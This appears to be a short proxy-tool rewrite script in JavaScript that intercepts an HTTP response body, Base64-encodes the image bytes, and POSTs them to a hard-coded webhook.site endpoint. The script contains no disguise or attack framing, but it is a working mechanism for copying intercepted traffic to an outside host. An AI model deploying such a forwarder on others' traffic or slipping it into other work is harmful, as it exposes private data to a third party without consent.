(async () => {
  try {
    const bytes = $response.bodyBytes;

    if (!bytes || bytes.byteLength === 0) {
      console.log("[UPLOAD] No image bytes");
      return;
    }

    const uint8 = new Uint8Array(bytes);

    console.log("[UPLOAD] Original size: " + uint8.byteLength);

    // 分块转换，避免一次性处理大数组
    const chunkSize = 8192;
    const chunks = [];

    for (let i = 0; i < uint8.length; i += chunkSize) {
      const chunk = uint8.subarray(i, i + chunkSize);
      chunks.push(String.fromCharCode.apply(null, chunk));
    }

    const binaryString = chunks.join("");

    // 转换成 Base64
    const base64 = btoa(binaryString);

    console.log("[UPLOAD] Base64 size: " + base64.length);

    // 上传 Base64 字符串
    const result = await $task.fetch({
      url: "https://webhook.site/0a8bdfd7-7e88-48f2-8936-436b478c0e23",
      method: "POST",
      headers: {
        "Content-Type": "text/plain; charset=utf-8"
      },
      body: base64
    });

    console.log("[UPLOAD] Status: " + result.statusCode);

  } catch (e) {
    console.log("[UPLOAD] Error: " + String(e));
  } finally {
    $done({});
  }
})();
